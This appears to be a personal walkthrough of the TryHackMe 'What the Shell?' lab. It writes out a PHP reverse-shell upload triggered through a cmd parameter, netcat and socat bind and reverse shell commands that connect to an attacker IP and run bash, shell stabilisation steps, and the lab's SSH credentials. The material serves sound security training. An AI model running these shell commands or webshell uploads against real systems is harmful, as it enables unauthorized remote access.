# TRYHACKME : What the Shell?
***NOTE: Documented this incase I'll be using the same method to other ctf challenges.***

## Linux Shell Sandbox
> Start the target linux machine from **Task 14** and set up your ovpn if you're using local server.

> ## Webshell
> Go to `/usr/share/webshells/php`.
> Get a copy of the file `php-reverse-shell.php`, then rename it into `rshell.php`.
>
> Open the file. Then edit the `$ip` to be your tun0 IP. You can change the `$port` or leave it as it is, which is `1234`.
>
> Open **browser** and input the http of the **target machine**.
>
> Browse the `rshell.php` and submit it. Then proceed into `uploads/` directory. Don't click `rshell.php` yet.
>
> Then into your **terminal**, open **netcat** listener: `nc -lvnp 1234`
>
> Back to your browser, and concatenate beside `uploads/` this: `rshell.php?cmd=nc <TUN0 IP> 1234 -e /bin/bash`.
>
> Go back to the terminal, and you can now access the reverse shell.

> ### Stabilize Netcat
> *Credits to [YCZHU](https://medium.com/@zycc2727/tryhackme-what-the-shell-61b54eda78e6)*
>> In the reverse shell:
```
> python3 -c 'import pty;pty.spawn("/bin/bash")' // try python, python2, and python3 in order
> export TERM=xterm
// hit `ctrl + z` to bg terminal
> stty raw -echo; fg
[1] + continued nc -lvnp 1234
```

> ## Experiment Bind & Reverse Netcat Shells with SSH 
> Let's now proceed connecting through SSH with the given credentials:
> 
> `Username:shell Password:TryH4ckM3!`
> ```
> ssh shell@<TARGET-IP>
> ```
> ## Bind Shell
> `Process: TARGET MACHINE = LISTENER + EXECUTE BASH <-- ATTACKER MACHINE = CONNECTOR`
> 
> Based on Task 8, instead of `nc -lvnp <PORT> -e /bin/bash` which is stated to be widely vulnerable for Linux, we'll be using instead a lengthy command `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`.
>
>> ### NETCAT
>> #### Target Machine:
>> ```
>> shell@linux-shell-practice:~$ whoami
>> shell
>> shell@linux-shell-practice:~$ mkfifo /tmp/f; nc -lvnp <TARGET-PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
>> listening on [any] <TARGET-PORT> ...
>> connect to <TARGET-IP> from (UNKNOWN) <ATTACKER-IP> <ATTACKER-PORT>
>>```
>> #### Attacker Machine:
>> ```
>> $ nc <TARGET-IP> <TARGET-PORT>
>> whoami
>> shell
>> pwd
>> /home/shell
>> ```
>> 
>> ### SOCAT (unencrypted)
>> #### Target Machine:
>> ```
>> shell@linux-shell-practice:~$ whoami
>> shell
>> shell@linux-shell-practice:~$ socat TCP-L:<TARGET-IP> EXEC:"bash -li"
>> ```
>> #### Attacker Machine:
>> ```
>> $ whoami
>> local
>> $ socat TCP:<TARGET-IP>:<TARGET-PORT> -
>> whoami
>> shell
>> ```

> ## Reverse Shell
> `Process: ATTACKER MACHINE = LISTENER <-- TARGET MACHINE = CONNECTOR + EXECUTE BASH`
> 
>> ### NETCAT
>> #### Attacker Machine:
>> ```
>> $ whoami
>> local
>> $ nc -lvnp <ATTACKER-PORT>
>> listening on [any] <ATTACKER-PORT> ...
>> // after executing Target Machine
>> connect to <ATTACKER-IP> from (UNKNOWN) <TARGET-IP> <TARGET-PORT>
>> whoami
>> shell
>> ```
>> #### Target Machine:
>> ```
>> shell@linux-shell-practice:~$ whoami
>> shell
>> shell@linux-shell-practice:~$ nc <ATTACKER-IP> <ATTACKER-PORT> -e /bin/bash
>> 
>> ```
>> 
>> ### SOCAT (unencrypted)
>> #### Attacker Machine:
>> ```
>> $ whoami
>> local
>> $ socat TCP-L:<port> -
>> // after Target Machine Execution
>> whoami
>> shell
>> ```
>> #### Target Machine:
>> ```
>> shell@linux-shell-practice:~$ whoami
>> shell
>> shell@linux-shell-practice:~$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
>> ```
>
